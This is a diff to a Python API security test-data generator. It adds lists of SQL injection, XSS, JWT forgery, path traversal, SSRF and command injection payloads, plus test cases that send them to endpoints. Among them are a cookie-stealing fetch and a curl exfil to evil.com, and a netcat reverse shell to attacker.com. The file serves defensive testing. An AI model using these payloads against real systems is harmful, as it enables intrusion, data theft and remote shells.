@@ -40,18 +40,99 @@ class TestDataGenerator:
     """测试数据生成工具。只生成数据，不执行请求。"""
 
     SQL_INJECTION_PAYLOADS = [
+        # 经典注入
         "' OR '1'='1",
         "' OR '1'='1' --",
         "1; DROP TABLE users;",
         "1' UNION SELECT * FROM users--",
         "admin'--",
+        # 时间盲注
+        "1' AND SLEEP(5)--",
+        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "'; WAITFOR DELAY '00:00:05'--",
+        # 报错注入
+        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE()))--",
+        "1' AND UPDATEXML(1, CONCAT(0x7e, VERSION()), 1)--",
+        # 布尔盲注
+        "1' AND '1'='1",
+        "1' AND '1'='2",
+        # 堆叠查询
+        "1'; DROP TABLE users; SELECT * FROM products WHERE '1'='1",
+        # NoSQL 注入
+        '{"$gt": ""}',
+        "{$ne: null}",
+        # 二阶注入
+        "'; INSERT INTO users VALUES('hacker','pass');--",
     ]
 
     XSS_PAYLOADS = [
+        # 反射型
         "<script>alert(1)</script>",
         "<img src=x onerror=alert(1)>",
         "javascript:alert(1)",
         "<svg onload=alert(1)>",
+        # DOM 型
+        "<img src='x' onerror='document.body.innerHTML=\"<h1>XSS</h1>\"'>",
+        "<body onload=alert('XSS')>",
+        # 存储型
+        "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>",
+        # 属性注入
+        "\" onfocus=alert(1) autofocus=\"",
+        "' onmouseover='alert(1)",
+        # 编码绕过
+        "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+        # 无 script 标签
+        "<iframe src=javascript:alert(1)>",
+        "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+    ]
+
+    # JWT 攻击 Payload
+    JWT_ATTACK_PAYLOADS = [
+        # None 算法攻击
+        {"header": '{"alg":"none","typ":"JWT"}', "payload": '{"sub":"admin","iat":1516239022}'},
+        # 弱密钥
+        {"header": '{"alg":"HS256","typ":"JWT"}', "secret": "secret"},
+        {"header": '{"alg":"HS256","typ":"JWT"}', "secret": "password"},
+        # 过期 Token
+        {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiZXhwIjoxNTE2MjM5MDIyfQ.invalid"},
+        # 伪造 Token
+        {"token": "Bearer invalid_token_12345"},
+        # 空签名
+        {"header": '{"alg":"HS256","typ":"JWT"}', "payload": '{"admin":true}', "signature": ""},
+    ]
+
+    # 路径遍历 Payload
+    PATH_TRAVERSAL_PAYLOADS = [
+        "../../../etc/passwd",
+        "..\\..\\..\\windows\\system32\\config\\sam",
+        "....//....//....//etc/passwd",
+        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "/var/www/html/../../etc/shadow",
+        "file:///etc/passwd",
+    ]
+
+    # SSRF Payload
+    SSRF_PAYLOADS = [
+        "http://169.254.169.254/latest/meta-data/",
+        "http://127.0.0.1:8000/admin",
+        "http://localhost:6379/",           # Redis
+        "http://metadata.google.internal/",  # GCP
+        "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+    ]
+
+    # 命令注入 Payload
+    COMMAND_INJECTION_PAYLOADS = [
+        "; ls -la",
+        "| cat /etc/passwd",
+        "$(whoami)",
+        "`id`",
+        "&& ping -c 5 127.0.0.1",
+        "| curl http://evil.com/exfil?d=$(hostname)",
+        "; nc -e /bin/sh attacker.com 4444",
+        "%0a/bin/cat%20/etc/passwd",
     ]
 
     def generate_normal_cases(
@@ -85,6 +166,17 @@ class TestDataGenerator:
     ) -> list[TestCase]:
         cases = []
         uses_body = self._uses_body(method)
+
+        # 无参数 GET/HEAD/OPTIONS: 测试意外的 query params
+        if not parameters and not uses_body:
+            cases.append(TestCase(
+                name=f"[boundary] {method} {path} - unexpected query params",
+                description="Send unexpected query parameter, expect tolerant handling",
+                method=method, path=path,
+                params={"unexpected": "value"},
+                expected_status=[200, 400],
+                category="boundary", tags=["unexpected-params"],
+            ))
 
         if uses_body:
             cases.append(TestCase(
@@ -141,7 +233,7 @@ class TestDataGenerator:
                     name=f"[boundary] {method} {path} - zero value",
                     description="Parameter value is 0",
                     method=method, path=path,
-                    params={p["name"]: 0 for p in num_params} if method == "GET" else None,
+                    params={p["name"]: 0 for p in num_params} if not uses_body else None,
                     body={p["name"]: 0 for p in num_params} if uses_body else None,
                     expected_status=[200, 201, 400, 422],
                     category="boundary", tags=["zero-value"],
@@ -219,13 +311,14 @@ class TestDataGenerator:
     ) -> list[TestCase]:
         cases = []
 
+        # ── 认证绕过 ──────────────────────────────────────────
         if auth_required:
             cases.append(TestCase(
                 name=f"[security] {method} {path} - no auth",
                 description="Request without any authentication, expect 401",
                 method=method, path=path,
                 expected_status=401,
-                category="security", tags=["no-auth"],
+                category="security", tags=["no-auth", "owasp"],
             ))
             cases.append(TestCase(
                 name=f"[security] {method} {path} - invalid token",
@@ -233,7 +326,16 @@ class TestDataGenerator:
                 method=method, path=path,
                 headers={"Authorization": "Bearer invalid_token_xxx"},
                 expected_status=401,
-                category="security", tags=["invalid-token"],
+                category="security", tags=["invalid-token", "owasp"],
+            ))
+            # JWT None 算法攻击
+            cases.append(TestCase(
+                name=f"[security] {method} {path} - JWT none algorithm",
+                description="JWT with alg=none bypass, expect 401",
+                method=method, path=path,
+                headers={"Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9."},
+                expected_status=401,
+                category="security", tags=["jwt-attack", "owasp"],
             ))
 
         has_strings = (
@@ -243,28 +345,84 @@ class TestDataGenerator:
             or request_body_schema is not None
         )
 
+        tgt_field = "query" if method == "GET" else "name"
+
+        # ── SQL 注入（5 个代表性 payload） ─────────────────────
         if has_strings:
-            for i, payload in enumerate(self.SQL_INJECTION_PAYLOADS[:3]):
+            for i, payload in enumerate(self.SQL_INJECTION_PAYLOADS[:5]):
                 cases.append(TestCase(
                     name=f"[security] {method} {path} - SQL injection #{i+1}",
-                    description=f"SQL injection payload: {payload[:40]}",
+                    description=f"SQL injection: {payload[:40]}",
                     method=method, path=path,
-                    body={"query": payload} if method != "GET" else None,
+                    body={tgt_field: payload} if method != "GET" else None,
                     params={"q": payload} if method == "GET" else None,
                     expected_status=[400, 422, 200],
                     category="security", tags=["sql-injection", "owasp"],
                 ))
 
-            for i, payload in enumerate(self.XSS_PAYLOADS[:2]):
+        # ── XSS（3 个代表性 payload） ─────────────────────────
+        if has_strings:
+            for i, payload in enumerate(self.XSS_PAYLOADS[:3]):
                 cases.append(TestCase(
                     name=f"[security] {method} {path} - XSS #{i+1}",
-                    description=f"XSS payload: {payload[:40]}",
+                    description=f"XSS: {payload[:40]}",
                     method=method, path=path,
-                    body={"name": payload} if method != "GET" else None,
+                    body={tgt_field: payload} if method != "GET" else None,
                     params={"name": payload} if method == "GET" else None,
                     expected_status=[400, 422, 200],
                     category="security", tags=["xss", "owasp"],
                 ))
+
+        # ── 命令注入 ──────────────────────────────────────────
+        if has_strings:
+            for i, payload in enumerate(self.COMMAND_INJECTION_PAYLOADS[:3]):
+                cases.append(TestCase(
+                    name=f"[security] {method} {path} - CMD injection #{i+1}",
+                    description=f"Command injection: {payload[:40]}",
+                    method=method, path=path,
+                    body={"cmd": payload} if method != "GET" else None,
+                    params={"cmd": payload} if method == "GET" else None,
+                    expected_status=[400, 422, 200],
+                    category="security", tags=["cmd-injection", "owasp"],
+                ))
+
+        # ── 路径遍历 ──────────────────────────────────────────
+        if has_strings:
+            for i, payload in enumerate(self.PATH_TRAVERSAL_PAYLOADS[:3]):
+                cases.append(TestCase(
+                    name=f"[security] {method} {path} - path traversal #{i+1}",
+                    description=f"Path traversal: {payload[:40]}",
+                    method=method, path=path,
+                    params={"file": payload} if method == "GET" else None,
+                    body={"file": payload} if method != "GET" else None,
+                    expected_status=[400, 422, 200],
+                    category="security", tags=["path-traversal", "owasp"],
+                ))
+
+        # ── SSRF ──────────────────────────────────────────────
+        if has_strings:
+            for i, payload in enumerate(self.SSRF_PAYLOADS[:3]):
+                cases.append(TestCase(
+                    name=f"[security] {method} {path} - SSRF #{i+1}",
+                    description=f"SSRF probe: {payload[:50]}",
+                    method=method, path=path,
+                    params={"url": payload} if method == "GET" else None,
+                    body={"url": payload} if method != "GET" else None,
+                    expected_status=[400, 422, 200],
+                    category="security", tags=["ssrf", "owasp"],
+                ))
+
+        # ── CSRF ──────────────────────────────────────────────
+        # 测试是否缺少 CSRF token 保护（适用于有状态的 POST/PUT/DELETE）
+        if method in ("POST", "PUT", "DELETE", "PATCH"):
+            cases.append(TestCase(
+                name=f"[security] {method} {path} - missing CSRF token",
+                description="Request without CSRF/XSRF token header, expect 403",
+                method=method, path=path,
+                headers={"X-Requested-With": "XMLHttpRequest"},
+                expected_status=[403, 401, 400, 200],
+                category="security", tags=["csrf", "owasp"],
+            ))
 
         return cases
 
